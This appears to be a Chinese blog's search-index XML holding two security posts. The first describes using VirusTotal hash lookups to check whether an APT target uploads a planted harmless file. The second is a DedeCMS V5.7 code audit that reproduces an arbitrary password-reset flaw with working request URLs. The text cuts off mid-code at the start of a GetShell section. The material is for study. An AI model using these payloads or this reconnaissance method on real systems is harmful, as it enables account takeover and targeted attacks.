<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VirusTotal工具的-N种APT玩法</title>
      <link href="/2023/10/14/VirusTotal%E5%B7%A5%E5%85%B7%E7%9A%84-N%E7%A7%8DAPT%20%E7%8E%A9%E6%B3%95/"/>
      <url>/2023/10/14/VirusTotal%E5%B7%A5%E5%85%B7%E7%9A%84-N%E7%A7%8DAPT%20%E7%8E%A9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>针对 VirusTotal 是什么？很多玩安全的人都很熟悉了，本文主要想讨论下，VirusTotal 在 针对一些 APT 前期行动中，如何发挥比较重要的作用</p></blockquote><h2 id="简述一下杀软的原理"><a href="#简述一下杀软的原理" class="headerlink" title="简述一下杀软的原理"></a>简述一下杀软的原理</h2><p>静态查杀： 研究人员需要去尝试找到该软件所具有的 <strong>独特指纹</strong> ，并加入到杀毒软件的【特征库】中</p><blockquote><p>所谓 <strong>独特指纹</strong> 当然是其它软件【不】包含该特征，只有这个恶意软件才会包含该特征</p></blockquote><p>当杀毒软件扫描磁盘时，就是根据自带的【特征库】进行检查，如果某个文件正好包含了【特征库】中“某某恶意软件”的特征，就会触发报警。</p><p>动态查杀：一般来说，恶意软件总是会有一些比较奇怪的（反常的）行为。因此，杀毒软件会根据某个软件的行为，来判断其是否具有恶意。</p><blockquote><p>上面还是会有漏报，比如一款全新的恶意软件，在行为方面足够隐蔽，它还可以躲过“行为分析”。在这种情况下，杀软就会出现漏报</p></blockquote><h2 id="VirusTotal-的优势"><a href="#VirusTotal-的优势" class="headerlink" title="VirusTotal 的优势"></a>VirusTotal 的优势</h2><p>相比传统的杀毒软件，VirusTotal 具有完全不同的玩法——它自己并不研发杀软。</p><p>它的玩法是——把全球各种杀毒软件汇总到它的服务器上，然后提供一个 Web 界面给你使用。你如果怀疑某个文件有问题，可以把这个可疑的文件提交到它的网站上进行扫描。然后 VirusTotal 会告诉你，全球各大杀毒软件对这个文件的扫描结果，让你参考。</p><ol><li><h3 id="最大化避免了漏报"><a href="#最大化避免了漏报" class="headerlink" title="最大化避免了漏报"></a>最大化避免了漏报</h3><p>由于 VirusTotal 汇总了全球所有主流&#x2F;知名的杀毒软件；因此，最大程度的降低了漏报</p><blockquote><p>虽然 VirusTotal 汇总了全球主流的杀毒软件，它依然不是全能的。依然有可能出现某个恶意软件，VT 上所有的引擎都没查出来，即全部漏报</p></blockquote></li><li><h3 id="识别误报"><a href="#识别误报" class="headerlink" title="识别误报"></a>识别误报</h3><p>由于 VirusTotal 汇总了全球所有主流&#x2F;知名的杀毒软件，这么多杀毒软件，不可能同时都对同一个文件产生误报。因此，VirusTotal有助于帮你判断，某个文件的“报毒”到底是不是误报</p><blockquote><p>由于被 Google 收购 ，可以获得更好的基础设施，能上传更大的文件，而且扫描速度会更快等等</p></blockquote></li></ol><h2 id="VirusTotal-不一样的利用"><a href="#VirusTotal-不一样的利用" class="headerlink" title="VirusTotal  不一样的利用"></a>VirusTotal  不一样的利用</h2><blockquote><p>如果你提交的文件是首次提交（也就是之前没人提交过同样的文件），那么当你上传之后，VirusTotal 会立即进行一次扫描，反之，如果你提交的文件，之前已经有人提交过，那么 VirusTotal  不会进行扫描，而是直接显示最后一次扫描结果</p></blockquote><p>那么 VT 是如何判断两个文件是相同文件呢？</p><p>主要是VT 根据散列算法（SHA256） 判断文件是否相同，当你想要上传某个文件时，VT 界面上的 JS 代码会先在你本机计算该文件的 SHA256 散列值，然后拿计算结果去 VT 网站的数据库进行查找，如果这个散列值&#x2F;哈希值已经存在，说明相同的文件曾经被上传过，就不需要重新上传，直接跳到“最后一次扫描结果”的界面。</p><h3 id="关于-VT-搜索关键字的类型"><a href="#关于-VT-搜索关键字的类型" class="headerlink" title="关于 VT 搜索关键字的类型"></a>关于 VT 搜索关键字的类型</h3><p>大体上分为以下几种：</p><ol><li>散列值（针对文件，散列值可以是：SHA256、SHA1、MD5）</li><li>网址（针对网站）</li><li>域名（针对网站）</li></ol><blockquote><p>如果针对是高价值的目标，那么探测对方的安全防范意识是极其重要的</p></blockquote><p>为了判断对方是否习惯于使用 VT，你可以先用某种方式（邮件等）让对方得到一个完全无害的文件，并且该文件是全新的。如果你的攻击目标在得到该文件之后，上传到 VT 进行扫描，就会在 VT 上留下一个扫描历史。</p><p>作为攻击者，只要定期去 VT 查询该文件的散列值，就能判断出：对方拿到该文件之后，有没有提交到 VT 进行扫描。从而判断出：对方的“安全防范意识”是否足够高，从而为下一步的高级攻击做准备</p><blockquote><p>当然基于此，还可以不断发散思维</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> APT </category>
          
          <category> 前期探测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT Attack </tag>
            
            <tag> VirusTotalz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS-V5.7 代码审计</title>
      <link href="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="DedeCMS-V5-7前台任意用户密码重置"><a href="#DedeCMS-V5-7前台任意用户密码重置" class="headerlink" title="DedeCMS-V5.7前台任意用户密码重置"></a><strong>DedeCMS-V5.7前台任意用户密码重置</strong></h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>DeDeCMSV5.7SP2 正式版(2018-01-09)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// member/resetpassword.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 密码重设</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>        $Id: resetpassword.php 1 8:38 2010年7月9日Z tianya $</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>        DedeCMS.Member</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>      Copyright (c) 2007 - 2010, DesDev, Inc.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>        http://help.dedecms.com/usersguide/license.html</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span>           http://www.dedecms.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/config.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(DEDEMEMBER.<span class="string">&quot;/inc/inc_pwd_functions.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$dopost</span>)) <span class="variable">$dopost</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$id</span>)? <span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//验证验证码</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$vdcode</span>)) <span class="variable">$vdcode</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$svali</span> = <span class="title function_ invoke__">GetCkVdValue</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$vdcode</span>) != <span class="variable">$svali</span> || <span class="variable">$svali</span>==<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ResetVdValue</span>();</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;对不起，验证码输入错误！&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//验证邮箱，用户名</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$mail</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$userid</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起，请输入用户名或邮箱&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#(.*)@(.*)\.(.*)#&quot;</span>, <span class="variable">$mail</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起，请输入正确的邮箱格式&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">CheckUserID</span>(<span class="variable">$userid</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>) != <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;你输入的用户名 <span class="subst">&#123;$userid&#125;</span> 不合法！&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$member</span> = <span class="title function_ invoke__">member</span>(<span class="variable">$mail</span>, <span class="variable">$userid</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//以邮件方式取回密码；</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断系统邮件服务是否开启</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cfg_sendmail_bysmtp</span> == <span class="string">&quot;Y&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">sn</span>(<span class="variable">$member</span>[<span class="string">&#x27;mid&#x27;</span>],<span class="variable">$userid</span>,<span class="variable">$member</span>[<span class="string">&#x27;email&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起邮件服务暂未开启，请联系管理员&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//以安全问题取回密码；</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$type</span> == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$member</span>[<span class="string">&#x27;safequestion&#x27;</span>] == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起您尚未设置安全密码，请通过邮件方式重设密码&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword3.htm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$mid</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safequestion</span>)) <span class="variable">$safequestion</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safeanswer</span>)) <span class="variable">$safeanswer</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里存在没设置密保问题的用户，任意密码重置</span></span><br><span class="line">    <span class="comment">// 因为使用了不够严谨的 == 进行了比较，导致if语句的条件为真</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;safequestion&#x27;</span>] == <span class="variable">$safequestion</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;safeanswer&#x27;</span>] == <span class="variable">$safeanswer</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">sn</span>(<span class="variable">$mid</span>, <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>], <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&#x27;N&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//修改密码</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;对不起，请不要非法提交&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mid</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$row</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;对不起，请不要非法提交&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$setp</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$tptim</span>= (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">3</span>);</span><br><span class="line">        <span class="variable">$dtime</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dtime</span> - <span class="variable">$tptim</span> &gt; <span class="variable">$row</span>[<span class="string">&#x27;mailtime&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executenonequery</span>(<span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;对不起，临时密码修改期限已过期&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword2.htm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$setp</span> == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$key</span>)) <span class="variable">$pwdtmp</span> = <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sn</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$pwdtmp</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>] == <span class="variable">$sn</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$pwd</span> != <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$pwd</span> == <span class="variable">$pwdok</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$pwdok</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pwdok</span>);</span><br><span class="line">                    <span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">                    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executenonequery</span>(<span class="variable">$sql</span>);</span><br><span class="line">                    <span class="variable">$sql</span> = <span class="string">&quot;UPDATE `#@__member` SET `pwd` = &#x27;<span class="subst">$pwdok</span>&#x27; WHERE `mid` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executenonequery</span>(<span class="variable">$sql</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;更改密码成功，请牢记新密码&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起，新密码为空或填写不一致&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起，临时密码错误&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分析得到 86行，这里如果针对没有设置密保问题的用户，这里就为真，即就走到了 sn 了</p></blockquote><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>已注册一个copper 没有密保问题的用户，copper&#x2F;copper</p><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" class=""><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span>/member/resetpassword.php?dopost=safequestion&amp;safequestion=<span class="number">0.0</span>&amp;safeanswer=&amp;<span class="built_in">id</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><blockquote><p>通过php弱类型的转换’0.0’ &#x3D;&#x3D; ‘0’了。内部运算：先是把0.0（浮点数（0.0）转换为int(0)，然后字符串(‘0’)转换为int(0)，最后 0&#x3D;&#x3D;0 ，所以相等了</p><p>可以看到使用  ”0.0”,”0.”,”0e1”  都可以绕过前面的判断，最后进入sn() 函数，继续跟进</p></blockquote><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" class=""><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" class=""><p>此时拿到 修改验证码：xdVopoJi   修改密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span>/member/resetpassword.php?dopost=getpasswd&amp;<span class="built_in">id</span>=<span class="number">2</span>&amp;key=xdVopoJi</span><br></pre></td></tr></table></figure><p>将密码修改为 copper&#x2F;123456</p><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" class=""><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" class=""><h2 id="DedeCMS-V5-7后台多处GetShell"><a href="#DedeCMS-V5-7后台多处GetShell" class="headerlink" title="DedeCMS-V5.7后台多处GetShell"></a><strong>DedeCMS-V5.7</strong>后台多处GetShell</h2><h4 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span 